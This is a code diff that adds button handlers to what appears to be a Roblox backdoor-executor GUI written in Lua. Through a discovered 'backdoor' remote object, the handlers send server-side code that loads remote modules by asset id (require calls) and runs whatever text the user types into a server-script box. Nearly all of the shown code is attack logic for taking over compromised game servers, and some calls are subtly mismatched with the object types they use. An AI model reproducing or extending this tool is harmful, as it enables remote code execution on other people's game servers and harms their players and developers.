@@ -407,3 +407,49 @@ notify("PlaceId : " .. tostring(game.PlaceId))
 end
 end
 end)
+
+LMG2L["TextButton5_7"].MouseButton1Click:Connect(function()
+    if attached then
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    elseif backdoor.ClassName == "BindableEvent" then
+        backdoor:FireServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    elseif backdoor.ClassName == "BindableFunction" then
+        backdoor:InvokeServer([[require(9635947635).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    end
+    end
+end)
+
+LMG2L["TextButton4_8"].MouseButton1Click:Connect(function()
+    if attached then
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    elseif backdoor.ClassName == "BindableEvent" then
+        backdoor:FireServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    elseif backdoor.ClassName == "BindableFunction" then
+        backdoor:InvokeServer([[require(3229910984):respawn("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
+    end
+    end
+end)
+
+LMG2L["TextButton_a"].MouseButton1Click:Connect(function()
+if LMG2L["Servertext_c"].Text ~= "" then	
+pcall(function()	
+    if attached then
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer(LMG2L["Servertext_c"].Text)
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer(LMG2L["Servertext_c"].Text)
+    elseif backdoor.ClassName == "BindableEvent" then
+        backdoor:FireServer(LMG2L["Servertext_c"].Text)
+    elseif backdoor.ClassName == "BindableFunction" then
+        backdoor:InvokeServer(LMG2L["Servertext_c"].Text)
+    end
+    end
+	end)	
+	end
+end)
